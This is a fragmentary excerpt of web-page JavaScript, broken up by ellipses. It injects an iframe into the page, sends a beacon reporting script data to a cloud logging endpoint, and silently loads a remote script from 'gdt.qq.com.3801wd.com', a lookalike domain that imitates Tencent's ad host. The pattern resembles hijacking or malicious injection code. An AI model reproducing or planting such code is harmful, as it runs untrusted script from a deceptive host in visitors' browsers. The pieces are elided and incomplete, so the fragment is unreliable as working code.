...
document.body.appendChild(li_ifr);
        ...
        function getscript(){
                ...
                new Image().src  = "//aces.cn-hangzhou.log.aliyuncs.com/logstores/sys/track_ua.gif?APIVersion=0.6.0&trackid="+trackid+"&position=9&script=" + str;//isCrossDomain
...
//		new Image().src = blogs;
    ...
    (function() {
        ...
        s.async = true; 
        s.src ='//gdt.qq.com.3801wd.com/i_cc.js';
